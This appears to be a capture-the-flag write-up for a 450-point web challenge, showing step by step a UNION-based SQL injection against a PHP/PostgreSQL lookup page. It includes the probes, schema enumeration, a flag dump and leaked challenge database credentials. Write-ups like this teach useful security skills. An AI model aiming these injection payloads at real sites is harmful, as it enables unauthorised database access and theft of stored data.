# You Snitch — WEB, 450 pts

Target: `http://54.72.82.22:8140` (Apache/2.4.68 Debian, PHP/8.3.35)
Flag: **`safctf{73c4979d1dccb358dbfbaca5233666ca}`**

## Recon

- `GET /` → static "THE DAILY SCOOP" page (Apache, `Last-Modified`/`ETag`, no
  framework fingerprints). Two links:
  - `/secrets.zip` — "Open the press pack"
  - `/lookup.php` — "Search the archive"
- `/secrets.zip` → zip containing `secrets` with Prisma-style Postgres creds:
  `postgresql://olwen:Olwen+SereneVale#2024@localhost:8032/olwendb?schema=public`
  (red herring for direct access — DB bound to localhost; useful context only).
- `GET /lookup.php` → renders `<h1>Newsroom records</h1>` with one row `Olwen`
  and a form `<input name="name">`.

The `name` parameter is reflected into an `<input value="...">` *and* used to
look up records.

## Vulnerability: UNION-based SQL injection in `lookup.php?name=`

The parameter is concatenated raw into a single-column query, e.g.
`SELECT name FROM <t> WHERE name = '$name'`.

Probes:
| input | HTTP | output |
|---|---|---|
| `Olwen` | 200 | lists `Olwen` |
| `Olwen'` | 503 | `Archive database is starting` (syntax error swallowed) |
| `Olwen'--` | 200 | lists `Olwen` (comment closes the string) |
| `Olwen' OR '1'='1` | 200 | lists `Olwen`, `Riann` (two rows exist) |
| `Olwen' AND '1'='2` | 200 | empty list |

Single quote ⇒ HTTP 503 is the error oracle; the row list is the boolean/data
oracle. Confirmed single visible column and UNION:

```
zz' UNION SELECT version()--          -> PostgreSQL 15.19 ... (Alpine musl)
zz' UNION SELECT current_user--       -> snitch_reader
zz' UNION SELECT current_user--       -> snitch_reader
```

(Note: Postgres requires a trailing space for `--` to start a line comment.)

## Exploitation

Schema discovery via `information_schema`:

```
string_agg(table_name,',') FROM information_schema.tables
  -> users, super_secret, ...
string_agg(column_name,',') ... WHERE table_name='super_secret'   -> id,secret
string_agg(column_name,',') ... WHERE table_name='users'          -> id,name
```

Dump the flag column:

```
zz' UNION SELECT id||' => '||secret FROM super_secret--
  -> 1 => safctf{73c4979d1dccb358dbfbaca5233666ca}
```

HTML entity `&gt;` is returned for `>`; the flag itself is plain.

## Notes / gotchas

- Intermittent `HTTP 400 "Invalid case name"` was observed on some larger
  payloads (likely a light input filter / rate limiter). Re-issuing the exact
  same request succeeded; keep payloads short and retry once on 400.
- `SELECT 1 FROM users` (multi-row without aggregation) returned the 503 error
  page — use `string_agg(...)` to collapse multi-row results into one cell.

## Artifacts

- `solve.py` — one-shot extractor: takes base URL, probes `version()`, then
  pulls `string_agg(secret,...) FROM super_secret` and prints the flag.
- `probe.py`, `sqlrun.py` — interactive helpers used during triage.
